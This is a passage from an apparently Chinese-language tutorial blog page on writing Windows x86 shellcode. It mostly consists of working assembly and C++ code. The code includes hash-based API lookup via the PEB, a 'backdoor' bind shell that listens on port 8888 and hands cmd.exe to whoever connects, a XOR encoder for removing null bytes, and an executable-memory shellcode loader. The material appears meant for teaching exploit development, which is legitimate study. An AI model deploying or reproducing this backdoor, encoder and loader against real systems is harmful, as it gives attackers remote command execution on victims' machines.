x8B\x7E\x24\x8D\x3C\x3A\x89\x7D\xF4\x33\xC0\xFC\xEB\x01\x40\x8B\x75\xF8\x8B\x34\x86\x8B\x55\x08\x8D\x34\x32\x8B\x7D\x0C\x8B\x4D\x10\xF3\xA6\x75\xE9\x8B\x75\xF4\x33\xFF\x66\x8B\x3C\x46\x8B\x5D\xFC\x8B\x1C\xBB\x8B\x55\x08\x8D\x04\x1A\x5F\x5E\x5A\x59\x8B\xE5\x5D\xC2\x10\x00\x55\x8B\xEC\x83\xEC\x20\x51\x52\x56\x57\xE8\x64\xFF\xFF\xFF\x89\x45\xFC\x6A\x0D\x8B\x4D\x08\x51\x50\xE8\x73\xFF\xFF\xFF\x89\x45\xF8\x6A\x0F\x8B\x4D\x08\x8D\x49\x0D\x51\x8B\x55\xFC\x52\xE8\x5E\xFF\xFF\xFF\x89\x45\xF4\x8B\x4D\x08\x8D\x49\x1C\x51\xFF\x55\xF8\x89\x45\xF0\x8B\x4D\x08\x8D\x49\x27\x51\xFF\x75\xF0\xFF\x55\xF4\x6A\x00\x6A\x00\x8B\x5D\x08\x8D\x5B\x33\x53\x6A\x00\xFF\xD0\x5F\x5E\x5A\x59\x8B\xE5\x5D\xC2\x04\x00"</span>
</code></pre>
<ul>
<li>shellcode瘦身</li>
</ul>
<pre class=" language-c++"><code class="language-c++">DWORD getHashCode(char *strname)
&#123;
    DWORD digest = 0;
    while (*strname)
    &#123;
        digest = (digest<<25 | digest>>7);
        digest = digest + *strname;
        strname++;
    &#125;
    return digest;   
&#125;
</code></pre>
<pre class=" language-c++"><code class="language-c++">#include<windows.h>
#include<iostream>
void _declspec(naked)shellCode()
&#123;
    
    __asm
    &#123;
            // user32.dll 75 73 65 72 33 32 2E 64   6C 6C 00             长度：0xB
            
            // hello 51hook 68 65 6C 6C 6F 20 35 31 68 6F 6F 6B   00     长度：0xD
            // kernel32.dll 6B 65 72 6E  65 6C 33 32  2E 64 6C 6C 00
            // ExitProcess 0x4FD18963
            // LoadLibraryA:0XC917432
            // GetProcAddress:0XBBAFDF85
            // MessageBoxA:0x1E380A6A
        
            //1.保存字符串信息
            pushad
            sub esp, 0x30

            //kenerl32.dll
            
            mov byte ptr ds : [esp - 1] , 0x0
            sub esp, 0x1
            push 0x6C6C642E
            push 0x32336C65
            push 0x6E72656B

            //hello 51hook 字符串
            mov byte ptr ds : [esp - 1] , 0x0
            sub esp, 0x1
            push 0x6B6F6F68
            push 0x3135206F
            push 0x6c6c6568

            //user32.dll 字符串
            mov byte ptr ds : [esp - 1] , 0x0
            sub esp, 0x1
            mov ax, 0x6c6c
            mov word ptr ds : [esp - 2] , ax
            sub esp, 0x2
            push 0x642e3233
            push 0x72657375
            
            mov ecx, esp
            push ecx
            call fun_payload


        //popad
        //2.获取模块基址
        fun_GetModule :
            push ebp
            mov ebp, esp
            sub esp, 0xc
            push esi
            mov esi, dword ptr fs : [0x30]//PEB指针
            mov esi, [esi + 0xc]//LDR结构体地址
            mov esi, [esi + 0x1c]//list
            mov esi, [esi]//list的第二项 kernel32
            mov esi, [esi + 0x8]//dllbase
            mov eax, esi
            pop esi
            mov esp, ebp
            pop ebp
            retn

        //查找API函数：
        fun_GetProcAddr :
            push ebp
            mov ebp, esp
            sub esp, 0x20
            push esi
            push edi
            push edx
            push ebx
            push ecx

            mov edx, [ebp + 0X8]//dllbase
            mov esi, [edx + 0x3c]//lf_anew
            lea esi, [edx + esi]//Nt头
            mov esi, [esi + 0x78]//导出表RVA
            lea esi, [edx + esi]//导出表VA
            mov edi, [esi + 0x1c]//EAT RVA
            lea edi, [edx + edi]//EAT VA
            mov[ebp - 0x4], edi//eatva
            mov edi, [esi + 0x20]//ENT RVA
            lea edi, [edx + edi]//ENT va
            mov[ebp - 0x8], edi//ENTVA
            mov edi, [esi + 0x24]//EOT RVA
            lea edi, [edx + edi]//
            mov[ebp - 0xc], edi//EOTVA
            //比较字符串获取API
            xor eax, eax
            xor ebx,ebx
            cld
            jmp tag_cmpfirst
            tag_cmpLoop :
            inc ebx
            tag_cmpfirst :
            mov esi, [ebp - 0x8]//ENT
            mov esi, [esi + ebx * 4]//RVA
            lea esi, [edx + esi]//函数名称字符串地址
            mov edi, [ebp + 0xc]//要查找的目标函数名称哈希值
            
            push esi//传参
            call fun_hashCode        //对ENT表函数名称进行编码
            cmp eax,edi                    //哈希值比较
            jne tag_cmpLoop

            mov esi, [ebp - 0xc]//eot
            xor edi, edi//为了不影响结果清空edi
            mov di, [esi + ebx * 2]//eat表索引
            mov edx, [ebp - 0x4]//eat
            mov esi, [edx + edi * 4]//函数地址rva
            mov edx, [ebp + 0x8]//dllbase
            lea eax, [edx + esi]//funaddr va

            pop ecx
            pop ebx
            pop edx
            pop edi
            pop esi
            mov esp, ebp
            pop ebp
            retn 0x8

        //hashCode部分
        fun_hashCode:
            push ebp
            mov ebp, esp
            sub esp, 0X4
            push ecx
            push edx
            push ebx
            mov dword ptr[ebp - 0x4], 0
            mov esi, [ebp + 0x8]
            xor ecx, ecx
            tag_hashLoop :
            xor eax, eax
            mov al, [esi + ecx]
            test al, al
            jz tag_end
            mov ebx, [ebp - 0x4]
            shl ebx, 0x19
            mov edx, [ebp - 0x4]
            shr edx, 0x7
            or ebx, edx
            add ebx, eax
            mov[ebp - 0x4], ebx
            inc ecx//ecx++
            jmp tag_hashLoop
            tag_end :
            mov eax, [ebp - 0x4]
            pop ebx
            pop edx
            pop ecx
            mov esp, ebp
            pop ebp
            retn 0x4

        //paylod部分
        fun_payload:
            push ebp
            mov ebp, esp
            sub esp, 0x30
            push esi
            push edi
            push edx
            push ebx
            push ecx

            //1.先拿到dllbase
            call fun_GetModule
            mov[ebp - 0x4], eax

            //2.获取LoadLibraryA
            
            push 0XC917432//LoadLibraryA 哈希值
            push eax
            call fun_GetProcAddr
            mov[ebp - 0x8], eax//LoadLibraryA 地址

            //3.获取GetProcAddress
            
            push 0xBBAFDF85//GetProcAddress 哈希值
            push [ebp - 0x4]//kener32.dllbase
            call fun_GetProcAddr
            mov[ebp - 0xc], eax//GetProcAddress 函数地址

            //4.调用LoadLibraryA 加载user32.dll
            mov ecx, [ebp + 0x8]
            push  ecx
            call [ebp - 0x8]//调用loadlibraya获取 user32.dll 
            mov [ebp - 0x10], eax//user32base

            //5.调用fun_GetProcAddr 获取MessageBoxA地址
            
            push  0x1E380A6A//MessageBoxA 哈希值
            push [ebp - 0x10]
            call fun_GetProcAddr//获取MessageBoxA的函数地址
            mov[ebp - 0x14], eax
            //6.输出hello 51hook
            push 0
            push 0
            mov ecx, [ebp + 0x8]
            lea ecx, [ecx + 0xB]//字符串hello 51hook偏移
            push ecx
            push 0
            call[ebp - 0x14]//MessageBoxA

            //通过loadLibraryA 获取kernel32.dll的基址 确保万无一失
            mov ecx, [ebp + 0x8]
            lea ecx, [ecx + 0x18]
            push ecx
            call[ebp - 0x8]//调用loadlibraya获取 user32.dll
            mov[ebp - 0x18], eax//kener32.dllbase

            //退出程序0x4FD18963
            push  0x4FD18963//ExitProcess 哈希值
            push[ebp - 0x18]
            call fun_GetProcAddr//获取ExitProcess的函数地址
            mov [ebp-0x2c],eax
            push 0
            call[ebp - 0x2c]//调用 ExitProcess
            pop ecx
            pop ebx
            pop edx
            pop edi
            pop esi
            mov esp,ebp
            pop ebp
            retn 0x4
</code></pre>
<ul>
<li>后门</li>
</ul>
<pre class=" language-c++"><code class="language-c++">#include<windows.h>
#include<iostream>
void _declspec(naked)shellCode()
&#123;

    __asm
    &#123;
        // ws2_32.dll 77 73 32 5F 33 32 2E 64  6C 6C  00    长度：0xB
        // cmd.exe 63 6D 64 2E 65 78 65 00长度：0x8
        // kernel32.dll 6B 65 72 6E   65 6C 33 32   2E 64 6C 6C   00
        // LoadLibraryA 0XC917432
        // WSAStartup 0x80B46A3D
        // WSASocketA 0xDE78322D
        // bind 0XDDA71064
        // listen 0x4BD39F0C
        // accept 0X1971EB1
        // CreateProcessA 0X6BA6BCC9
        // ExitProcess 0x4FD18963
    
        //1.保存字符串信息
        push ebp
        mov ebp,esp
        sub esp, 0x30
        //kernel32.dll
        mov byte ptr ds : [ebp - 1] , 0x0
        mov dword ptr[ebp-0x5], 0x6C6C642E
        mov dword ptr[ebp - 0x9], 0x32336C65
        mov dword ptr[ebp - 0xD], 0x6E72656B
        //cmd.exe
        mov dword ptr [ebp - 0x11],0x00657865
        mov dword ptr[ebp-0x15],0x2e646d63
        
        //ws2_32.dll
        mov byte ptr[ebp-0x16],0
        mov word ptr[ebp-0x18],0x6c6c
        mov dword ptr[ebp-0x1C], 0x642e3233
        mov dword ptr[ebp-0x20], 0x5f327377

        mov ecx, esp
        lea ecx,[ecx+0x10]
        push ecx
        call fun_payload
        //popad
        //2.获取模块基址
        fun_GetModule :
            push ebp
            mov ebp, esp
            sub esp, 0xc
            push esi
            mov esi, dword ptr fs : [0x30]//PEB指针
            mov esi, [esi + 0xc]//LDR结构体地址
            mov esi, [esi + 0x1c]//list
            mov esi, [esi]//list的第二项 kernel32
            mov esi, [esi + 0x8]//dllbase
            mov eax, esi
            pop esi
            mov esp, ebp
            pop ebp
            retn
        fun_GetProcAddr :
            push ebp
            mov ebp, esp
            sub esp, 0x20
            push esi
            push edi
            push edx
            push ebx
            push ecx

            mov edx, [ebp + 0X8]//dllbase
            mov esi, [edx + 0x3c]//lf_anew
            lea esi, [edx + esi]//Nt头
            mov esi, [esi + 0x78]//导出表RVA
            lea esi, [edx + esi]//导出表VA
            mov edi, [esi + 0x1c]//EAT RVA
            lea edi, [edx + edi]//EAT VA
            mov[ebp - 0x4], edi//eatva
            mov edi, [esi + 0x20]//ENT RVA
            lea edi, [edx + edi]//ENT va
            mov[ebp - 0x8], edi//ENTVA
            mov edi, [esi + 0x24]//EOT RVA
            lea edi, [edx + edi]//
            mov[ebp - 0xc], edi//EOTVA
            //比较字符串获取API
            xor eax,eax
            xor ebx,ebx
            cld
            jmp tag_cmpfirst
            tag_cmpLoop :
            inc ebx
            tag_cmpfirst :
            mov esi, [ebp - 0x8]//ENT
            mov esi, [esi + ebx * 4]//RVA
            lea esi, [edx + esi]//函数名称字符串
            mov edi, [ebp + 0xc]//要查找的目标函数名称
            
            push esi//传参
            call fun_GetHashCode//获取ENT函数名称的哈希值
            cmp edi,eax
            jne tag_cmpLoop

            mov esi, [ebp - 0xc]//eot
            xor edi, edi//为了不影响结果清空edi
            mov di, [esi + ebx * 2]//eat表索引
            mov edx, [ebp - 0x4]//eat
            mov esi, [edx + edi * 4]//函数地址rva
            mov edx, [ebp + 0x8]//dllbase
            lea eax, [edx + esi]//funaddr va

            pop ecx
            pop ebx
            pop edx
            pop edi
            pop esi
            mov esp, ebp
            pop ebp
            retn 0x8

        fun_GetHashCode:
            push ebp
            mov ebp, esp
            sub esp, 0X4
            push ecx
            push edx
            push ebx
            mov dword ptr[ebp - 0x4], 0
            mov esi, [ebp + 0x8]
            xor ecx, ecx
            tag_hashLoop :
            xor eax, eax
            mov al, [esi + ecx]
            test al, al
            jz tag_end
            mov ebx, [ebp - 0x4]
            shl ebx, 0x19
            mov edx, [ebp - 0x4]
            shr edx, 0x7
            or ebx, edx
            add ebx, eax
            mov[ebp - 0x4], ebx
            inc ecx//ecx++
            jmp tag_hashLoop
            tag_end :
            mov eax, [ebp - 0x4]
            pop ebx
            pop edx
            pop ecx
            mov esp, ebp
            pop ebp
            retn 0x4

        //payload
        fun_payload:
            push ebp
            mov ebp, esp
            sub esp, 0x300
            //1.先拿到dllbase
            call fun_GetModule
            //2.获取LoadLibraryA
            push 0XC917432//LoadLibraryA 哈希值
            push eax
            call fun_GetProcAddr
            mov[ebp - 0x4], eax//LoadLibraryA 地址
            //3.调用LoadLibraryA 加载ws2_32.dll
            mov ecx, [ebp + 0x8]//ws2_32.dll字符串地址
            push  ecx
            call[ebp - 0x4]//调用loadlibraya获取 ws2_32.dll
            mov [ebp - 0x8],eax//ws2_32base
            //4.获取kernel32.dll模块基址
            mov ecx, [ebp + 0x8]//kernel32.dll字符串地址
            lea ecx,[ecx+0x13]
            push  ecx
            call[ebp - 0x4]//调用loadlibraya获取 kernel32.dll
            mov [ebp-0xc],eax//kernel32base
            
            //获取WSAStartup地址
            push 0x80B46A3D//WSAStartup 哈希值
            push [ebp - 0x8]//ws2_32 基址
            call fun_GetProcAddr
            
            lea esi,[ebp-0x300]//WSADATA 结构体
            push esi
            push 0x0202
            call eax
            //获取 WSASocketA 地址并调用
            push 0xDE78322D//WSASocketA 哈希值
            push[ebp - 0x8]//ws2_32 基址
            call fun_GetProcAddr
            //调用WSASocketA
            push 0
            push 0
            push 0
            push 0x6
            push 0x1
            push 0x2
            call  eax
            mov [ebp-0x10],eax//socket
            
            //查找bind 并调用
            //获取 bind 地址并调用
            push 0XDDA71064//bind 哈希值
            push[ebp - 0x8]//ws2_32 基址
            call fun_GetProcAddr
            mov word ptr[ebp-0x200],0x2
            mov word ptr[ebp-0x1FE],0XB822//22B8 8888 大端序
            mov dword ptr[ebp-0x1FC],0
            push 0x10//sizeof(SOCKADDR_IN)
            lea esi,[ebp-0x200]//&SOCKADDR_IN
            push esi
            push [ebp-0x10]//socket
            call eax
            //获取listen地址 并调用
            push 0x4BD39F0C//listen 哈希值
            push[ebp - 0x8]//ws2_32 基址
            call fun_GetProcAddr
            push 0x7FFFFFFF
            push  [ebp-0x10]//socket
            call eax
            //获取accept 并调用
            push 0X1971EB1//listen 哈希值
            push[ebp - 0x8]//ws2_32 基址
            call fun_GetProcAddr
            push 0
            push 0
            push [ebp-0x10]
            call eax
            mov [ebp-0x10],eax
            
            //初始化STARTUPINFOA结构体
            lea edi,[ebp-0x90]//STARTUPINFOA结构体首地址
            xor eax,eax
            mov ecx,0x11
            cld
            rep stosd
            mov dword ptr[ebp-0x90],0x44//sinfo.cb
            mov dword ptr[ebp-0x64],0x100//sinfo.dwFlags
            mov word ptr[ebp-0x60],0x0//sinfo.wShowWindow
            mov esi,[ebp-0x10]//socket
            mov dword ptr[ebp-0x58],esi
            mov dword ptr[ebp-0x54],esi
            mov dword ptr[ebp - 0x50],esi
            //获取CreateProcessA 并调用
            push 0X6BA6BCC9//listen 哈希值
            push[ebp - 0xC]//kener32 基址
            call fun_GetProcAddr

            lea edi,[ebp-0x200]
            lea esi,[ebp-0x90]
            mov ecx,[ebp+0x8]
            lea ecx,[ecx+0xB]
            push edi
            push esi
            push 0
            push 0
            push 0
            push 1
            push 0
            push 0
            push ecx
            push 0
            call eax//CreateProcessA

            mov esp,ebp
            pop ebp
            retn 0x4
    &#125;
&#125;
int main()
&#123;
    printf("hello 51hook");
    shellCode();
    return 0;
&#125;
</code></pre>
<ul>
<li>Win7 LoadLibraryEx</li>
</ul>
<p>Win10系统kernelbase 中有LoadLibraryA</p>
<p>Win7中没有</p>
<p>解决方案：</p>
<p>1、修改获取模块功能，遍历list 根据模块名称匹配kernel32</p>
<p>2、将LoadLibraryA 改成LoadLibraryExA</p>
<ul>
<li>Shellcode编码：</li>
</ul>
<p>目前shellcode中包含大量的00 ，要解决这个问题需要对shellcode进行编码，</p>
<pre class=" language-assembly"><code class="language-assembly">xor a,b key

Key 0-0xff

A,B

Key 
</code></pre>
<p>因为shellcode最终是需要执行的，所以在执行前还得解码，所以这个加密或者编码得是可逆的，最简单办法 对每个字节进行异或运算，异或运算的key 在0-0xff之间 ，依次去加密，直到加密完所有字节都没有出现00 才是最合适的key</p>
<p>Shellcode解码：</p>
<p>1、由于不知道shellode的具体地址得根据偏移量计算shellcode位置，这就需要获取当前eip的值</p>
<p>获取当前EIP 的值的方法：</p>
<p>1、0x4000000 call 0x400005  E8 00000</p>
<p>  0x4000005 pop eax//此时eax为当前指令所在地址</p>
<p>2、0x4000000 call 0x400004 </p>
<p>  0x4000005 retn//此时eax为当前指令所在地址</p>
<p>Pop eax</p>
<pre class=" language-c++"><code class="language-c++">    BOOL EncodeShellcode(char *shellCode,int shellCodesize)

&#123;

  BOOL result = TRUE;

  unsigned char nkey = 0x00;

  unsigned char* encodeBuff = new unsigned char[shellCodesize+1]&#123;&#125;;

  for (unsigned char key=0; key<0xFF;key++)
  &#123;
    result = TRUE;
    nkey = key;

    for (int i=0;i<shellCodesize;i++)
    &#123;
       encodeBuff[i] = shellCode[i] ^ key;
       if (encodeBuff[i]==0X00)
      &#123;
        result = FALSE;
        break;
       &#125;
    &#125;
    if (result)
    &#123;
       break;
    &#125;    

  &#125;

  if (!result)

  &#123;
   return FALSE;

  &#125;

  FILE* fp;

  fopen_s(&fp, "encodeShellcode.txt", "w+");

  fprintf(fp, "key===0x%0.2X\n", nkey);

  fprintf(fp, "shellcode[]：\n\"", nkey);

  for (int i = 0; i < shellCodesize; i++)
  &#123;
   fprintf(fp, "\\x%0.2X", encodeBuff[i]);
    if((i+1)%12==0)
    fprintf(fp, "\" \\ \n\"");
  &#125;

  fprintf(fp, "\"");
  return result;

&#125;

</code></pre>
<h2 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h2><pre class=" language-c++"><code class="language-c++">#include <stdio.h>
#include <windows.h>
using namespace std;
int main()
&#123;
    char shellcode[] = "Shellcode";
    LPVOID lpAlloc = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, sizeof shellcode);
    ((void(*)())lpAlloc)();
    return 0;
&#125;
</code></pre>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>